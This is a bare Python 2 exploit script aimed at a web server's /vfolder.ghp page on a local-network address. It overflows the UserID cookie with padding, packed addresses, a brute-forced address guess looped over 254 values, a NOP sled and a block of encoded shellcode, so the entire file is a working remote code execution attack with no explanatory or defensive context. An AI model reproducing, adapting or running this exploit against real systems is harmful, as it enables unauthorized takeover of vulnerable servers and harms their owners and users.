#!/usr/bin/python

import sys,socket,os,struct

host = '192.168.1.26'
port = 80

shellcode = ("\xbf\x69\xde\xe9\x3c\xd9\xed\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x78\x12\x03\x78\x12\x83\x81\x22\x0b\xc9\xad\x33\x4e"
"\x32\x4d\xc4\x2f\xba\xa8\xf5\x6f\xd8\xb9\xa6\x5f\xaa\xef\x4a"
"\x2b\xfe\x1b\xd8\x59\xd7\x2c\x69\xd7\x01\x03\x6a\x44\x71\x02"
"\xe8\x97\xa6\xe4\xd1\x57\xbb\xe5\x16\x85\x36\xb7\xcf\xc1\xe5"
"\x27\x7b\x9f\x35\xcc\x37\x31\x3e\x31\x8f\x30\x6f\xe4\x9b\x6a"
"\xaf\x07\x4f\x07\xe6\x1f\x8c\x22\xb0\x94\x66\xd8\x43\x7c\xb7"
"\x21\xef\x41\x77\xd0\xf1\x86\xb0\x0b\x84\xfe\xc2\xb6\x9f\xc5"
"\xb9\x6c\x15\xdd\x1a\xe6\x8d\x39\x9a\x2b\x4b\xca\x90\x80\x1f"
"\x94\xb4\x17\xf3\xaf\xc1\x9c\xf2\x7f\x40\xe6\xd0\x5b\x08\xbc"
"\x79\xfa\xf4\x13\x85\x1c\x57\xcb\x23\x57\x7a\x18\x5e\x3a\x13"
"\xed\x53\xc4\xe3\x79\xe3\xb7\xd1\x26\x5f\x5f\x5a\xae\x79\x98"
"\x9d\x85\x3e\x36\x60\x26\x3f\x1f\xa7\x72\x6f\x37\x0e\xfb\xe4"
"\xc7\xaf\x2e\xaa\x97\x1f\x81\x0b\x47\xe0\x71\xe4\x8d\xef\xae"
"\x14\xae\x25\xc7\xbf\x55\xae\x28\x97\x54\x24\xc1\xea\x56\x29"
"\x4d\x62\xb0\x23\x7d\x22\x6b\xdc\xe4\x6f\xe7\x7d\xe8\xa5\x82"
"\xbe\x62\x4a\x73\x70\x83\x27\x67\xe5\x63\x72\xd5\xa0\x7c\xa8"
"\x71\x2e\xee\x37\x81\x39\x13\xe0\xd6\x6e\xe5\xf9\xb2\x82\x5c"
"\x50\xa0\x5e\x38\x9b\x60\x85\xf9\x22\x69\x48\x45\x01\x79\x94"
"\x46\x0d\x2d\x48\x11\xdb\x9b\x2e\xcb\xad\x75\xf9\xa0\x67\x11"
"\x7c\x8b\xb7\x67\x81\xc6\x41\x87\x30\xbf\x17\xb8\xfd\x57\x90"
"\xc1\xe3\xc7\x5f\x18\xa0\xe8\xbd\x88\xdd\x80\x1b\x59\x5c\xcd"
"\x9b\xb4\xa3\xe8\x1f\x3c\x5c\x0f\x3f\x35\x59\x4b\x87\xa6\x13"
"\xc4\x62\xc8\x80\xe5\xa6")

for i in xrange(1,255):
	n = ""
	if i < 16:
		n = "0" + hex(i)[-1]
	else:
		n = hex(i)[2:]
		
	guess = "0x01" + n + "9898"
	print "trying", guess
	
	payload = 'A' * 20
	payload += struct.pack("<I", 0x1001646a)
	payload += 'B' * 56
	payload += struct.pack("<I", int(guess, 16))
	
	payload += '\x90' * 20
	payload += shellcode

	buf = (
	"GET /vfolder.ghp HTTP/1.1\r\n"
	"User-Agent: Mozilla/4.0\r\n"
	"Host:" + host + ":" + str(port) + "\r\n"
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	"Accept-Language: en-us\r\n"
	"Accept-Encoding: gzip, deflate\r\n"
	"Referer: http://" + host + "/\r\n"
	"Cookie: SESSIONID=6771; UserID=" + payload + "; PassWD=;\r\n"
	"Conection: Keep-Alive\r\n\r\n"
	)

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host,port))
	sock.send(buf)
	sock.close()